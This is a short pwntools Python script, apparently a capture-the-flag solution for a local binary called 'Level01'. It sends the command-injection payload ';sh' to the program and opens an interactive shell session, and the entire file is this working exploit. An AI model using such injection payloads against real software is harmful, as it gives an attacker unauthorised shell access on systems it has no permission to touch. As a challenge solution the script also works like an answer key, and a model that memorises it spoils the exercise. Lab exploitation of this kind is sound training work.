from pwn import *

p = process('./Level01')

payload = b";sh"
p.sendline(payload)

p.interactive()


